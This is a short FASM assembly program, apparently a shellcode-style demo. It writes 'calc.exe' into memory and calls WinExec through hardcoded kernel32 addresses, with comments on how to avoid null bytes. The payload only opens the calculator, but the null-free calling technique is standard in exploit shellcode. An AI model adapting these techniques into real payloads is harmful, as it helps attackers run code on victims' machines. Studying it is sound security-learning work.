format PE GUI 4.0

entry EntryPoint

include 'win32a.inc'
include 'macro\proc32.inc'

proc EntryPoint
  mov eax, 0x75DE0FA0 ; kernel32.data+FA0

  mov byte [eax+1], 'c'
  mov byte [eax+2], 'a'
  mov byte [eax+3], 'l'
  mov byte [eax+4], 'c'
  mov byte [eax+5], '.'
  mov byte [eax+6], 'e'
  mov byte [eax+7], 'x'
  mov byte [eax+8], 'e'
  inc eax ; avoid using \x00 in 'mov byte [eax]' instruction

  mov edx, 0x75D92B02 ; kernel32.WinExec+2, +2 to avoid using '\0' (we will skip 'mov edi, edi' instruction)

  push SW_SHOW
  push eax
  call edx

  ret
endp